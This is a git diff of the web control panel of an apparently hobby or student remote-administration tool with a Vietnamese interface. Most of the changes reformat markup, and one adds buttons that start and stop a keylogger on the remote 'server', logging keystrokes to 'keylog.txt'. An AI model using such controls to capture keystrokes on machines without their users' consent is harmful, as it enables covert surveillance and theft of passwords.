@@ -65,8 +65,7 @@
                 </button>
             </div>
 
-            <div id="app-list"
-                class="h-96 overflow-y-auto bg-gray-900 p-3 rounded-md border border-gray-700">
+            <div id="app-list" class="h-96 overflow-y-auto bg-gray-900 p-3 rounded-md border border-gray-700">
                 <p class="text-gray-500 text-center">Nhấn "Làm mới" để xem danh sách.</p>
             </div>
         </div>
@@ -99,12 +98,13 @@
                 </button>
             </div>
 
-            <div id="pm-list"
-                class="h-96 overflow-y-auto bg-gray-900 p-3 rounded-md border border-gray-700">
+            <div id="pm-list" class="h-96 overflow-y-auto bg-gray-900 p-3 rounded-md border border-gray-700">
                 <table class="w-full text-left table-auto" id="pm-table">
                     <thead></thead>
                     <tbody>
-                        <tr><td class="text-gray-500 text-center p-4">Nhấn "Làm mới".</td></tr>
+                        <tr>
+                            <td class="text-gray-500 text-center p-4">Nhấn "Làm mới".</td>
+                        </tr>
                     </tbody>
                 </table>
             </div>
@@ -113,12 +113,29 @@
         <!-- SCREENSHOT -->
         <div class="mt-6 bg-gray-800 p-4 rounded-lg shadow-lg">
             <h2 class="text-xl font-semibold text-white mb-3">Chụp màn hình Server</h2>
-            <button id="btn-capture"
-                class="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded-md">
+            <button id="btn-capture" class="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded-md">
                 Chụp màn hình
             </button>
 
             <div id="screenshot-result" class="mt-4"></div>
+        </div>
+
+        <!-- KEYLOGGER -->
+        <div class="mt-6 bg-gray-800 p-4 rounded-lg shadow-lg">
+            <h2 class="text-xl font-semibold text-white mb-3">Keylogger</h2>
+            <p class="text-sm text-gray-400 mb-3">
+                Bắt đầu hoặc dừng dịch vụ keylogger trên server. (Log sẽ được ghi vào file 'keylog.txt' trên server).
+            </p>
+            <div class="flex space-x-2">
+                <button id="start-keylog-btn"
+                    class="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded-md">
+                    Bắt đầu Keylogger
+                </button>
+                <button id="stop-keylog-btn"
+                    class="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded-md">
+                    Dừng Keylogger
+                </button>
+            </div>
         </div>
     </div>
 
@@ -154,7 +171,10 @@
             pmTable: document.getElementById("pm-table"),
 
             capture: document.getElementById("btn-capture"),
-            screenshot: document.getElementById("screenshot-result")
+            screenshot: document.getElementById("screenshot-result"),
+
+            startKeylog: document.getElementById("start-keylog-btn"),
+            stopKeylog: document.getElementById("stop-keylog-btn")
         };
 
         function log(msg, type = "info") {
@@ -163,8 +183,8 @@
 
             p.className =
                 type === "error" ? "text-red-400" :
-                type === "success" ? "text-green-400" :
-                "text-blue-400";
+                    type === "success" ? "text-green-400" :
+                        "text-blue-400";
 
             p.textContent = `[${t}] ${msg}`;
             ui.log.appendChild(p);
@@ -317,8 +337,11 @@
         ui.startProc.onclick = () => send({ command: "start_process", path: ui.procPath.value.trim(), args: ui.procArgs.value });
         ui.pmRefresh.onclick = () => send({ command: "list_processes" });
         ui.capture.onclick = () => send({ command: "capture_screen" });
+        ui.startKeylog.onclick = () => send({ command: "start_keylog" });
+        ui.stopKeylog.onclick = () => send({ command: "stop_keylog" });
 
     </script>
 
 </body>
+
 </html>
